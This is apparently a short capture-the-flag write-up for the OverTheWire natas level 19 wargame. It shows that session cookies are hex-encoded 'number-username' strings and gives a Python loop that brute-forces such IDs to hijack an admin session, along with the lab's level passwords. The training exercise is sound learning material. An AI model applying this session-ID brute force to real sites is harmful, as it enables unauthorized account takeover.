# [natas 19](http://natas19.natas.labs.overthewire.org)

    Username: natas19
    Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

This level the "PHPSESSID" field of the cookie is not a simple number.
Let me see some samples.

    PHPSESSID: 3332352d61      ~   325-a
    PHPSESSID: 39342d617364    ~   94-asd
    PHPSESSID: 3139382d617364  ~   198-asd

Obviously the PHPSESSID consists of a number and a username.
Modify natas18's python script slightly.

    import requests
    for i in range(641):
        r = requests.get('http://natas19.natas.labs.overthewire.org/', auth=('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={'PHPSESSID': "".join([hex(ord(ch))[2:] for ch in str(i)+"-admin"])})
        if 'You are an admin' in r.text:
            print(r.text)
            break

Record the result.

    Username: natas20
    Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

